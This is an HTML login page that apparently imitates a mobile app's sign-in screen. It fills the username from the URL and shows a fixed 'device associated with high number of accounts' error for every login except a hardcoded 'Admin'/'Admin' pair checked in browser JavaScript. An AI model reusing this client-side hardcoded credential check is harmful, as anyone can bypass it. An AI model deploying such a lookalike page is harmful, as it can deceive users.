<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap");
    body {
      font-family: "Inter", sans-serif;
    }
    ::-webkit-scrollbar {
      display: none;
    }

    /* Checkbox fix: shows checkmark */
    input[type="checkbox"] {
      appearance: none;
      -webkit-appearance: none;
      width: 1rem;
      height: 1rem;
      border: 1px solid #d1d5db;
      border-radius: 0.25rem;
      position: relative;
      cursor: pointer;
    }
    input[type="checkbox"]:checked::after {
      content: "âœ”";
      font-size: 0.75rem;
      color: #00b0ff;
      position: absolute;
      top: -2px;
      left: 2px;
    }
  </style>
</head>
<body class="bg-white min-h-screen flex flex-col overflow-hidden max-w-md mx-auto relative">
  <div class="pt-10 px-6 relative flex flex-col flex-grow">
    <button aria-label="Back" class="absolute top-10 left-6 text-[#00b5e7] text-xl leading-none">
      <i class="fas fa-chevron-left"></i>
    </button>
    <h1 class="mt-16 mb-10 text-center text-black text-2xl font-normal font-sans">Log In</h1>
    <form id="loginForm" class="flex flex-col space-y-6">
      <div class="flex flex-col">
        <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans" autocomplete="username" />
      </div>
      <div class="flex flex-col relative">
        <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10" autocomplete="current-password" />
        <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
          <i id="eyeIcon" class="fas fa-eye-slash"></i>
        </button>
      </div>
      <p id="errorMsg" class="text-sm text-red-500 font-normal font-sans leading-tight hidden">
        SS07: Device associated with high number of accounts. Learn more <a href="#" class="text-blue-600 underline">here</a>.
      </p>
      <label class="inline-flex items-center space-x-2 font-sans text-sm text-black">
        <input type="checkbox" checked />
        <span>Save Login Info on your iCloud devices</span>
      </label>
      <a href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2" id="forgotPassword">Forgot your password?</a>
    </form>
  </div>

  <button id="loginBtn" type="button" class="bg-[#00b0ff] text-white font-normal text-base font-sans py-3 rounded-full mx-6 fixed bottom-4 left-1/2 transform -translate-x-1/2" disabled>Log In</button>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const usernameInput = document.getElementById("username");
      const passwordInput = document.getElementById("password");
      const loginBtn = document.getElementById("loginBtn");
      const errorMsg = document.getElementById("errorMsg");
      const forgot = document.getElementById("forgotPassword");

      // Prefill username from URL
      const path = window.location.pathname.split("/");
      if(path[1]) usernameInput.value = decodeURIComponent(path[1]);

      function checkInputs() {
        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
          loginBtn.classList.remove("bg-gray-400");
          loginBtn.classList.add("bg-[#00b0ff]");
          loginBtn.disabled = false;
        } else {
          loginBtn.classList.remove("bg-[#00b0ff]");
          loginBtn.classList.add("bg-gray-400");
          loginBtn.disabled = true;
        }
      }

      usernameInput.addEventListener("input", checkInputs);
      passwordInput.addEventListener("input", checkInputs);

      loginBtn.addEventListener("click", function() {
        if(usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
          if(usernameInput.value !== "Admin" || passwordInput.value !== "Admin") {
            errorMsg.classList.remove("hidden");
            passwordInput.value = "";
            loginBtn.classList.remove("bg-[#00b0ff]");
            loginBtn.classList.add("bg-gray-400");
            loginBtn.disabled = true;
          } else {
            window.location.href = "admin.html";
          }
        }
      });

      window.togglePassword = function() {
        const eyeIcon = document.getElementById("eyeIcon");
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          eyeIcon.classList.remove("fa-eye-slash");
          eyeIcon.classList.add("fa-eye");
        } else {
          passwordInput.type = "password";
          eyeIcon.classList.remove("fa-eye");
          eyeIcon.classList.add("fa-eye-slash");
        }
      };

      // Position login button above keyboard only when input is focused
      function updateButtonPosition() {
        const active = document.activeElement;
        if(active && (active.tagName === "INPUT" || active.tagName === "TEXTAREA")) {
          const rect = forgot.getBoundingClientRect();
          loginBtn.style.position = "fixed";
          loginBtn.style.bottom = `${window.innerHeight - rect.top + 12}px`;
        } else {
          loginBtn.style.position = "fixed";
          loginBtn.style.bottom = "16px";
        }
      }

      const inputs = document.querySelectorAll("input");
      inputs.forEach(input => {
        input.addEventListener("focus", updateButtonPosition);
        input.addEventListener("blur", () => setTimeout(updateButtonPosition, 100));
      });

      window.addEventListener("resize", updateButtonPosition);
      updateButtonPosition();
    });
  </script>
</body>
</html>
